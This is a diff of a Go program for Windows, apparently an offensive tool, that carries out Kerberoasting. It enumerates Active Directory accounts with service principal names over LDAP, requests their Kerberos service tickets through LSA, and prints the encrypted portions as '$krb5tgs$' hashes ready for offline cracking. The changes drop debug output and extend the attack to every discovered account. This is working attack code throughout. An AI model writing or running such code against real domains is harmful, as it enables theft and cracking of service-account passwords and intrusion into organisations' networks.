@@ -4,9 +4,12 @@ package main
 
 import (
 	_ "embed"
+	"encoding/hex"
 	"fmt"
 	"log"
 	"math"
+	"regexp"
+	"strconv"
 	"syscall"
 	"unsafe"
 
@@ -169,8 +172,8 @@ func ldap_get_values(ld uintptr, entry uintptr, attr string) string {
 	return string(resByte)
 }
 
-func getDomainSPNTicket() {
-	spn := "HTTP/testad.local"
+func getDomainSPNTicket(user User) {
+	spn := user.servicePrincipalName
 	var hLsa uintptr
 	if LsaConnectUntrusted(&hLsa) != STATUS_SUCCESS {
 		panic("KerberosTicketsManger::InitializeConnection: LsaConnectUntrusted failed")
@@ -192,14 +195,12 @@ func getDomainSPNTicket() {
 	authPkgId := DEFAULT_AUTH_PKG_ID
 	ticketsStatus := LsaLookupAuthenticationPackage(hLsa, &lsaStrAuthPkg, &authPkgId)
 	if ticketsStatus != STATUS_SUCCESS {
-		fmt.Println(ticketsStatus)
 		panic("KerberosTicketsManger::InitializeConnection: LsaLookupAuthenticationPackage failed")
 	}
 	luid := windows.LUID{LowPart: 0, HighPart: 0}
 	hSec := SecHandle{dwLower: 0, dwUpper: 0}
 
 	krbTmp := make([]byte, int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
-	fmt.Printf("krbTmpLength: %d\n", int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
 	siz := int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{})) + ((len(spn)) * 2)
 	kerbRetrieveTktRequest := (*KERB_RETRIEVE_TKT_REQUEST)(unsafe.Pointer(&krbTmp[0]))
 	// KERB_RETRIEVE_TKT_REQUEST{}
@@ -226,7 +227,6 @@ func getDomainSPNTicket() {
 	kerbRetrieveTktRequest.credentialsHandle = hSec
 	protocolSubmitBuffer := uintptr(unsafe.Pointer(kerbRetrieveTktRequest))
 	submitBufferLength := uint32(siz)
-	fmt.Printf("submitBufferLength: %d\n", submitBufferLength)
 	// protocolReturnBufferBase := KERB_RETRIEVE_TKT_RESPONSE{}
 	// protocolReturnBuffer := uintptr(unsafe.Pointer(&protocolReturnBufferBase))
 	var protocolReturnBuffer uintptr
@@ -235,31 +235,32 @@ func getDomainSPNTicket() {
 	ticketsStatus = LsaCallAuthenticationPackage(hLsa, authPkgId, protocolSubmitBuffer, submitBufferLength, &protocolReturnBuffer, &responseLen, &protocolStatus)
 
 	if ticketsStatus != STATUS_SUCCESS {
-		fmt.Println(ticketsStatus)
 		panic("KerberosTicketsManger::RequestTicketFromSystem: LsaCallAuthenticationPackage failed")
 	}
 	if protocolStatus != STATUS_SUCCESS {
-		fmt.Println(protocolStatus)
 		panic("KerberosTicketsManger::RequestTicketFromSystem: ProtocolStatus failed")
 	}
-	fmt.Println(responseLen)
-	fmt.Println(protocolReturnBuffer)
 	encodedTicket := []byte{}
 	protocolReturnBufferRaw := (*KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(protocolReturnBuffer))
-	fmt.Println(protocolReturnBufferRaw)
-
-	fmt.Println(&protocolReturnBufferRaw)
 	for i := 0; i < int(protocolReturnBufferRaw.ticket.encodedTicketSize); i++ {
 		offset := i
 		tmp := *(*byte)(unsafe.Add(unsafe.Pointer(protocolReturnBufferRaw.ticket.encodedTicket), offset))
-		// fmt.Println(tmp)
 		encodedTicket = append(encodedTicket, tmp)
 	}
 
-	fmt.Println(encodedTicket)
+	ticketHexStream := hex.EncodeToString(encodedTicket)
+	reg := regexp.MustCompile("a382....3082....a0030201(..)a1.{1,4}.......a282(....)........(.+)")
+	group := reg.FindAllStringSubmatch(ticketHexStream, -1)
+
+	eType, _ := strconv.ParseInt(group[0][1], 16, 64)             //binary.BigEndian.Uint64(eTypeByte)
+	cipherTextLenBase, _ := strconv.ParseInt(group[0][2], 16, 64) //binary.BigEndian.Uint64(eTypeByte)
+	cipherTextLen := int(cipherTextLenBase - 4)
+	dataToEnd := group[0][3]
+	cipherText := dataToEnd[:cipherTextLen*2]
+	fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, "user", "domain", spn, cipherText[:32], cipherText[32:])
 }
 
-func kerberoast() {
+func kerberoast() []User {
 	var nameType uint32 = windows.ComputerNameDnsDomain
 	var bufSize uint32 = 0
 
@@ -267,7 +268,6 @@ func kerberoast() {
 	hostNameByte := make([]uint8, bufSize)
 	GetComputerNameExA(nameType, unsafe.Pointer(&hostNameByte[0]), &bufSize)
 	hostName := string(hostNameByte[:len(hostNameByte)-1])
-	fmt.Println(hostName)
 
 	ld, _ := ldap_initW(hostName, LDAP_PORT)
 	iRtn := ldap_bind_sW(ld, nil, nil, LDAP_AUTH_NEGOTIATE)
@@ -283,15 +283,14 @@ func kerberoast() {
 	}
 
 	numEntries := ldap_count_entries(ld, res)
-	fmt.Printf("entries found: %d\n", numEntries)
 	domainDN := ldap_get_values(ld, res, "defaultNamingContext")
 	base, err := syscall.BytePtrFromString(domainDN)
 	if err != nil {
-		return
+		panic(err)
 	}
 	filter, err := syscall.BytePtrFromString("(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))")
 	if err != nil {
-		return
+		panic(err)
 	}
 
 	ldapStatus = ldap_search_sA(ld, base, LDAP_SCOPE_SUBTREE, filter, nil, 0, &res)
@@ -300,8 +299,6 @@ func kerberoast() {
 	}
 
 	numEntries = ldap_count_entries(ld, res)
-	fmt.Printf("entries found: %d\n", numEntries)
-
 	entry := ldap_first_entry(ld, res)
 
 	var users []User
@@ -312,16 +309,16 @@ func kerberoast() {
 		users = append(users, User{sAMAccountName: samAccountName, distinguishedName: distinguishedName, servicePrincipalName: servicePrincipalName})
 		entry = ldap_next_entry(ld, res)
 	}
-
-	fmt.Println(users)
 	ldap_unbind_s(ld)
+	return users
 }
 
 func main() {
-	// hSec := SecHandle{dwLower: 0, dwUpper: 0}
-	// fmt.Println(unsafe.Sizeof(hSec))
-	kerberoast()
-	getDomainSPNTicket()
+	users := kerberoast()
+	for _, user := range users {
+		getDomainSPNTicket(user)
+	}
+
 	// usage := `Usage: usage`
 	// if len(os.Args) < 2 {
 	// 	fmt.Println(usage)
